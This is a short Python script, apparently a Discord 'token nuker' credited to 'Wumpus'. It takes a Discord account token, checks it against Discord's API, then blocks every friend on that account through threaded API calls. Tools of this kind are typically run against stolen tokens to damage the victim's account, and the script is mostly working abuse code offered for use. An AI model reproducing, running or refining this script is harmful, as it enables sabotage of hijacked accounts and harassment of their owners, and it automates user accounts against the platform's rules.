import requests
import threading
import os
from pystyle import Center, Colorate, Colors, Anime
import colorama
from colorama import Fore, Style

os.system('cls')

print(Colorate.Horizontal(Colors.blue_to_cyan, """
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

colorama.init(autoreset=True)

def get_token_info(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code != 200:
        print(f"{Fore.RED}[ERROR] Invalid token.")
        exit()
    return headers

def block_friends(token, friends):
    headers = {'Authorization': token}
    for friend in friends:
        try:
            requests.put(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', 
                         headers=headers, json={"type": 2})
            print(f"{Fore.GREEN}[BLOCKED] {friend['user']['username']}#{friend['user']['discriminator']}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Could not block {friend['user']['username']}#{friend['user']['discriminator']} - {e}")

def main():
    token = input(f"{Fore.YELLOW}Enter Discord Token: {Style.RESET_ALL}").strip()
    headers = get_token_info(token)

    friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    if not friends:
        print(f"{Fore.BLUE}[INFO] No friends found.")
        return

    threads = []
    for chunk in [friends[i:i+3] for i in range(0, len(friends), 3)]:
        t = threading.Thread(target=block_friends, args=(token, chunk))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{Fore.YELLOW}[DONE] All friends blocked.")

if __name__ == "__main__":
    main()
